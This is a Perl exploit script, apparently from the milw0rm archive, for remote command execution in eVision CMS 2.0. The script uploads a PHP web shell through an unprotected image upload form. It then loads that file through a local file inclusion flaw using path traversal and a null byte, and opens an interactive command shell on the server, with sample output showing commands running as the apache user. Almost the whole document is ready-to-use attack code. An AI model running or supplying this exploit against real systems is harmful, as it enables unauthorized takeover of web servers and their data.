<html><head><title>eVision CMS 2.0 Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl

# -----------------------------------------------------------------------------
#                      INFORMATIONS
# -----------------------------------------------------------------------------

# eVision CMS 2.0
# http://kent.dl.sourceforge.net/sourceforge/e-vision/eVision-2.0.tar.gz
# Remote Command Execution Exploit
# by Osirys
# osirys[at]live[dot]it
# Greets to: evilsocket, DarkJoker, emgent, Jay and str0ke

# This cms is vulnerable to arbitrary file upload. The problem is that when
# the user uploads a file, on it will be added the .gif extension. but this
# cms is vulnerable to Local File Inclusion,so we can include the .gif file
# and execute it.

# ------------------------------------------------------------------
# Exploit in action :D
# ------------------------------------------------------------------
# osirys[~]&gt;$ perl rcE.txt http://localhost/eVision-2.0/
#
#  ---------------------------
#    eVision CMS RCE Exploit
#        Coded by Osirys
#  ---------------------------

# [+] Evil php code uploaded !
# [+] Including now evil file with LFI vulnerability
# [+] Injection succesfully ! Remote Command execution works !

# shell[localhost]$&gt; whoami
# apache
# shell[localhost]$&gt; id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$&gt; pwd
# /home/osirys/web/eVision-2.0/modules/tour/adminpart
# shell[localhost]$&gt; exit
# [-] Quitting ..
# osirys[~]&gt;$
# ------------------------------------------------------------------

use LWP::UserAgent;
use IO::Socket;
use HTTP::Request::Common;

my $img_up_path = &quot;/modules/brandnews/adminpart/img_upload.php&quot;;
my $up_path     = &quot;/modules.conf/brandnews/showpart/icons/&quot;;
my $lfi_path    = &quot;/modules/tour/adminpart/addtour.php?module=&quot;;
my $rce_path    = &quot;../../../modules.conf/brandnews/showpart/icons/&quot;;
my $vuln_code   = &quot;&lt;?php system(\$_GET[cmd]); ?&gt;&quot;;
my $lfile       = &quot;osi.txt&quot;;
my $nfile       = &quot;osirys.txt&quot;;
my $host        = $ARGV[0];


($host) || help(&quot;-1&quot;);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

open ($file, &quot;&gt;&gt;&quot;, $lfile);
print $file &quot;$vuln_code\n&quot;;
close($file);

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);


my $url = $host.$img_up_path;
my $ua = LWP::UserAgent-&gt;new;
my $re = $ua-&gt;request(POST $url,
                                Content_Type =&gt; 'form-data',
                                Content      =&gt; [
                                                   upload_img =&gt; [$lfile, Content_Type =&gt; 'text/plain'],
                                                   upload_label =&gt; $nfile,
                                                   upload_submit =&gt; 'Upload'
                                                ]
                     );

unlink($lfile);

if ($re-&gt;is_success){
    my $t_re = get_req($host.$up_path.$nfile.&quot;.gif&quot;);
    if ($t_re =~ /&lt;\?php/) {
        print &quot;[+] Evil php code uploaded !\n&quot;;
        print &quot;[+] Including now evil file with LFI vulnerability\n&quot;;
        my $re = get_req($host.$lfi_path.$rce_path.$nfile.&quot;.gif%00&amp;cmd=id&quot;);
        if ($re =~ /uid/) {
            print &quot;[+] Injection succesfully ! Remote Command execution works !\n\n&quot;;
            $lfi_rce = $host.$lfi_path.$rce_path.$nfile.&quot;.gif%00&amp;cmd=&quot;;
            &amp;exec_cmd;
        }
        else {
            print &quot;[-] Something goes wrong !\n&quot;;
            print &quot;[-] Exploit Failed\n\n&quot;;
            exit(0);
        }
    }
    else {
        print &quot;[-] Upload failed\n&quot;;
        print &quot;[-] Exploit Failed\n\n&quot;;
        exit(0);
    }
}
else {
    print &quot;[-] Unable to upload evil file !\n&quot;;
    print &quot;[-] Exploit Failed\n\n&quot;;
    exit(0);
}

sub exec_cmd {
    my @outs;
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print &quot;shell[$h0st]\$&gt; &quot;;
    $cmd = &lt;STDIN&gt;;
    $cmd !~ /exit/ || die &quot;[-] Quitting ..\n&quot;;
    $exec_url = ($lfi_rce.$cmd);
    $re = get_req($exec_url);
    if ($re =~ /(.)/) {
        push(@outs,$re);
        foreach my $o(@outs) {
            print &quot;$o&quot;;
        }
        &amp;exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print &quot;bash: &quot;.$cmd.&quot;: command not found\n&quot;;
        $c &lt; 3 || die &quot;[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n&quot;;
        &amp;exec_cmd;
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return $full_det;
}

sub banner {
    print &quot;\n&quot;.
          &quot;  --------------------------- \n&quot;.
          &quot;    eVision CMS RCE Exploit   \n&quot;.
          &quot;        Coded by Osirys       \n&quot;.
          &quot;  --------------------------- \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Bad hostname! \n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path\n\n&quot;;
    exit(0);
}

# milw0rm.com [2009-02-02]</pre></html>